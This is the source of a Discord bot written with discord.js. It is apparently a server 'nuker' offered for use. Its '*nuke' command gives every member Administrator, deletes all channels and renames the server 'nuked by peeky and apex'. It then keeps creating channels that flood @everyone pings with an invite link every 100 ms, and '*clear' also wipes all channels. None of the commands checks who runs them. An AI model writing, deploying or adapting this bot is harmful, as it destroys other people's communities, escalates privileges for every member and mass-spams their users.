const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
require('dotenv').config();
const express = require('express');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const app = express();
const port = 3000;

app.get('/', (req, res) => {
  const imagePath = path.join(__dirname, 'index.html');
  res.sendFile(imagePath);
});

app.listen(port, () => {
  console.log('\x1b[36m[ SERVER ]\x1b[0m', '\x1b[32m SH : http://localhost:' + port + ' ✅\x1b[0m');
});

let savedData = null; // To store the server's saved state
let nukeInterval; // To store the nuke process

client.once('ready', () => {
  console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mPing: ${client.ws.ping} ms \x1b[0m`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  // *save command
  if (message.content === '*save') {
    try {
      const guild = message.guild;
      savedData = {
        name: guild.name,
        channels: [],
        categories: [],
      };

      for (const channel of guild.channels.cache.values()) {
        if (channel.type === ChannelType.GuildCategory) {
          savedData.categories.push({
            id: channel.id,
            name: channel.name,
            children: channel.children.map((child) => ({
              name: child.name,
              type: child.type,
            })),
          });
        } else {
          savedData.channels.push({
            name: channel.name,
            type: channel.type,
            parent: channel.parent?.id || null,
          });
        }
      }

      message.channel.send('Server structure saved successfully.');
    } catch (error) {
      console.error('Error during save operation:', error);
      message.channel.send('Failed to save the server structure.');
    }
  }

  // *unnuke command
  if (message.content === '*unnuke') {
    try {
      if (!savedData) {
        message.channel.send('No saved data found. Use `*save` before using `*unnuke`.');
        return;
      }

      const channels = message.guild.channels.cache;
      for (const [id, channel] of channels) {
        await channel.delete();
      }

      await message.guild.setName(savedData.name);

      const categoryMap = new Map();
      for (const category of savedData.categories) {
        const newCategory = await message.guild.channels.create({
          name: category.name,
          type: ChannelType.GuildCategory,
        });
        categoryMap.set(category.id, newCategory.id);

        for (const child of category.children) {
          await message.guild.channels.create({
            name: child.name,
            type: child.type,
            parent: newCategory.id,
          });
        }
      }

      for (const channel of savedData.channels) {
        await message.guild.channels.create({
          name: channel.name,
          type: channel.type,
          parent: channel.parent ? categoryMap.get(channel.parent) : null,
        });
      }

      message.channel.send('Server structure restored successfully.');
    } catch (error) {
      console.error('Error during un-nuke operation:', error);
      message.channel.send('Failed to restore the server structure.');
    }
  }

  // Existing commands
  if (message.content === '*nuke') {
    try {
      const everyoneRole = message.guild.roles.everyone;
      await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);

      const channels = message.guild.channels.cache;
      for (const [id, channel] of channels) {
        await channel.delete();
      }

      await message.guild.setName('nuked by peeky and apex');

      const createAndSpamChannel = async () => {
        const channel = await message.guild.channels.create({
          name: 'nuked by peeky and apex',
          type: ChannelType.GuildText,
        });

        setInterval(() => {
          channel.send('@everyone @here https://discord.gg/jwYqu66bqm');
        }, 100);
      };

      await createAndSpamChannel();

      nukeInterval = setInterval(async () => {
        await createAndSpamChannel();
      }, 1000);
    } catch (error) {
      console.error('Error during nuke operation:', error);
    }
  }

  if (message.content === '*stop') {
    try {
      if (nukeInterval) {
        clearInterval(nukeInterval);
        nukeInterval = null;
        message.channel.send('Nuke process stopped.');
      } else {
        message.channel.send('No nuke process is currently running.');
      }
    } catch (error) {
      console.error('Error during stop operation:', error);
    }
  }

  if (message.content === '*clear') {
    try {
      if (nukeInterval) {
        clearInterval(nukeInterval);
        nukeInterval = null;
        message.channel.send('Nuke process stopped.');
      }

      const allChannels = message.guild.channels.cache;
      for (const [id, channel] of allChannels) {
        await channel.delete();
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));

      await message.guild.channels.create({
        name: 'general',
        type: ChannelType.GuildText,
      });

      message.channel.send('All channels have been deleted and a "general" channel has been created.');
    } catch (error) {
      console.error('Error during clear operation:', error);
    }
  }
});

async function login() {
  try {
    await client.login(process.env.TOKEN);
    console.log('\x1b[36m[ LOGIN ]\x1b[0m', `\x1b[32mLogged in as: ${client.user.tag} ✅\x1b[0m`);
    console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[35mBot ID: ${client.user.id} \x1b[0m`);
    console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mConnected to ${client.guilds.cache.size} server(s) \x1b[0m`);
  } catch (error) {
    console.error('\x1b[31m[ ERROR ]\x1b[0m', 'Failed to log in:', error);
    process.exit(1);
  }
}

login();
